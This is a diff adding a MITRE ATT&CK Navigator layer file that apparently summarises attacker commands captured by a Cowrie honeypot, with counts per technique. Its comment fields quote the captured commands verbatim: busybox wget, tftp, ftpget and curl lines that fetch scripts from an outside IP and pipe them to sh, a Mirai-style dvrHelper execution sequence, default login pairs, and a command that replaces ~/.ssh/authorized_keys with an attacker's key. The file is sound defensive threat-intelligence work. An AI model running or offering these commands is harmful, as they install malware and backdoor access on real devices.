@@ -1,0 +1,87 @@
+{
+  "name": "Greyfield observed techniques",
+  "versions": {
+    "attack": "19.2",
+    "navigator": "5.1",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "ATT&CK techniques mapped conservatively from Greyfield Cowrie observations; counts represent observed evidence, not attributed incidents.",
+  "techniques": [
+    {
+      "techniqueID": "T1059.004",
+      "score": 3654,
+      "comment": "sh; shell",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1110.001",
+      "score": 996,
+      "comment": "enable\\x00 / linuxshell\\x00; root / vizxv",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1083",
+      "score": 169,
+      "comment": "#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null) if [ \"$re fi done ar; #!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null) if [ \"$result\" != \"${result%(deleted)}\" ]; then kill -9 \"$pid\" fi done",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 169,
+      "comment": "Malformed transfer reference withheld; /bin/busybox wget http://45.90.163.37/wget.sh -O- | sh;/bin/busybox tftp -g 45.90.163.37 -r tftp.sh -l- | sh;/bin/busybox ftpget 45.90.163.37 ftpget.sh ftpget.sh && sh ftpget.sh;curl http://45.90.163.37/curl.sh -o- | sh",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1222.002",
+      "score": 127,
+      "comment": "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep; cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e \"\\x47\\x41\\x59\"",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 58,
+      "comment": "/bin/busybox hostname PBOC; uname -a",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1070.004",
+      "score": 32,
+      "comment": "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon; rm /dev/.t; rm /dev/.sh; rm /dev/.human",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1057",
+      "score": 7,
+      "comment": "top; ps -ef | grep '[Mm]iner'",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1053.003",
+      "score": 5,
+      "comment": "crontab -l",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1098.004",
+      "score": 5,
+      "comment": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1016",
+      "score": 2,
+      "comment": "/ip cloud print; ifconfig",
+      "enabled": true
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#17131f",
+      "#7857ff",
+      "#ff5d73"
+    ],
+    "minValue": 0,
+    "maxValue": 3654
+  }
+}
